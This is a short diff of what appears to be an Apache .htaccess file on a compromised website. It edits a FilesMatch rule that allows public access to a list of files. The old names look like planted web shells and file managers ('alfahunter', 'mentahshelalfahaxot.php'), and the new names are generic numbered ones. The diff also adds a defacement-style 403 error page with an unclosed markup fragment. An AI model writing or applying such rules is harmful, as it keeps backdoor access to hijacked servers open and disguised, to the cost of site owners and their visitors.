@@ -58,8 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(alfahunter.ShTML|kingsmanalfa.ShTmL|bisanih.php|ANAK-SEKOLAH.3.ShtML|fmanajer-fortune-1.ShTML|CHIP-JKT-UPLOADS.sHTmL|fmanajer-fortune-1.php|mentahshelalfahaxot.php|filemanajer-MAR.php|ANAK-SEKOLAH-MAR.ShTmL|STILL-ALIVE-MAR.sHtML|kingsmanalfa-MAR.php|alfahunter-MAR.php|KURAKURANINJA3.ShTML|pbmentahnew.php|waklabu.php)$">
+<FilesMatch "^(1.ShTML|2.shTml|3.shtmL|4.SHtML|5.sHTMl|1-MAR.php|2-MAR.php|3-MAR.php|4-MAR.php|5-MAR.php|1-OTH.php|2-OTH.php|3-OTH.php|4-OTH.php|5-OTH.php|)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
+ErrorDocument 403 '<center><img src="https://imgur.com/6Agy31i"></img> <h3></font><br><h2></h2>
